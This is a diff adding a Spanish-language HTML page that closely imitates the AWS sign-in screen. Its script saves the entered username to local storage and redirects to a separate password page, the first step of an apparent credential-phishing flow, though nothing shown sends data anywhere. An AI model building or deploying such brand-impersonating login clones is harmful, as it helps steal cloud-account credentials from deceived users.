@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>AWS – Iniciar sesión</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
+            background-color: #ffffff;
+            color: #111827;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Contenedor principal */
+        .page-wrapper {
+            width: 100%;
+            max-width: 1440px;
+            margin: 0 auto;
+            padding: 40px 16px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: relative;
+            flex: 1;
+        }
+
+        /* Logo */
+        .aws-logo {
+            margin-top: 40px;
+            margin-bottom: 30px;
+        }
+
+        .aws-logo img {
+            height: 60px;
+            width: auto;
+            display: block;
+            margin: 0 auto;
+        }
+
+        /* Tarjeta de login */
+        .login-card {
+            width: 100%;
+            max-width: 520px;
+            border: 1px solid #d1d5db;
+            border-radius: 2px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
+            padding: 24px 32px 28px;
+            background-color: #ffffff;
+        }
+
+        .login-card h1 {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 18px;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            margin-bottom: 4px;
+            color: #374151;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 7px 10px;
+            font-size: 13px;
+            border: 1px solid #9ca3af;
+            border-radius: 2px;
+            outline: none;
+            transition: border-color 0.15s ease, box-shadow 0.15s ease;
+        }
+
+        .form-group input:focus {
+            border-color: #f59e0b;
+            box-shadow: 0 0 0 1px #f59e0b;
+        }
+
+        .btn-primary {
+            margin-top: 10px;
+            width: 100%;
+            border: none;
+            border-radius: 2px;
+            padding: 8px 12px;
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+            background-color: #f59e0b;
+            color: #111827;
+            transition: background-color 0.15s ease;
+        }
+
+        .btn-primary:hover {
+            background-color: #d97706;
+        }
+
+        .login-footer-text {
+            margin-top: 16px;
+            font-size: 11px;
+            line-height: 1.4;
+            color: #4b5563;
+        }
+
+        .login-footer-text a {
+            color: #2563eb;
+            text-decoration: none;
+        }
+
+        .login-footer-text a:hover {
+            text-decoration: underline;
+        }
+
+        /* “Cajas” inferiores (decoración) */
+        .decor-bottom {
+            position: absolute;
+            bottom: 20px;
+            left: 0;
+            right: 0;
+            display: flex;
+            justify-content: space-between;
+            pointer-events: none;
+            padding: 0 40px;
+        }
+
+        .cube-group {
+            display: flex;
+            gap: 24px;
+            align-items: flex-end;
+        }
+
+        .cube {
+            border: 2px solid #d1d5f0;
+            width: 80px;
+            height: 80px;
+            border-radius: 4px;
+            position: relative;
+        }
+
+        .cube.small {
+            width: 60px;
+            height: 60px;
+        }
+
+        .cube.tall {
+            height: 110px;
+        }
+
+        /* Líneas internas para simular isométrico simple */
+        .cube::before,
+        .cube::after {
+            content: "";
+            position: absolute;
+            border: 1px solid #e5e7f5;
+        }
+
+        .cube::before {
+            inset: 12px 6px auto 6px;
+            height: 0;
+            border-width: 1px 0 0 0;
+        }
+
+        .cube::after {
+            inset: 6px auto 6px 50%;
+            width: 0;
+            border-width: 0 0 0 1px;
+        }
+
+        @media (max-width: 768px) {
+            .page-wrapper {
+                padding: 24px 12px 80px;
+            }
+
+            .decor-bottom {
+                display: none;
+                /* opcional: ocultar decoración en móviles */
+            }
+
+            .aws-logo {
+                margin-top: 20px;
+                margin-bottom: 20px;
+            }
+
+            .login-card {
+                max-width: 100%;
+                padding: 20px 16px 22px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="page-wrapper">
+        <!-- Logo AWS (pon aquí tu imagen) -->
+        <div class="aws-logo">
+            <!-- Reemplaza src por la ruta de tu logo -->
+            <img src="aws-logo.png" alt="AWS" />
+        </div>
+
+        <!-- Tarjeta de inicio de sesión -->
+        <div class="login-card">
+            <h1>Iniciar sesión</h1>
+
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="username">Nombre de usuario</label>
+                    <input type="text" id="username" name="username" />
+                </div>
+
+                <button type="submit" class="btn-primary">Siguiente</button>
+            </form>
+
+
+            <p class="login-footer-text">
+                Al continuar, acepta el
+                <a href="#">Contrato de usuario de AWS</a> u otro acuerdo
+                para los servicios de AWS y el
+                <a href="#">Aviso de privacidad</a>. Este sitio utiliza
+                cookies esenciales. Consulte nuestro
+                <a href="#">Aviso de cookies</a> para obtener más información.
+            </p>
+        </div>
+
+        <!-- Decoración inferior de cubos -->
+        <div class="decor-bottom">
+            <div class="cube-group">
+                <div class="cube tall"></div>
+                <div class="cube"></div>
+                <div class="cube small"></div>
+            </div>
+            <div class="cube-group">
+                <div class="cube small"></div>
+                <div class="cube tall"></div>
+                <div class="cube"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function (e) {
+            e.preventDefault();
+
+            const email = document.getElementById("username").value;
+            console.log("Correo ingresado:", email);
+
+            // Guardar el correo para usarlo en la pantalla 2
+            localStorage.setItem("aws_email", email);
+
+            // Redirigir a la pantalla 2
+            window.location.href = "password.html";
+        });
+
+    </script>
+</body>
+
+</html>
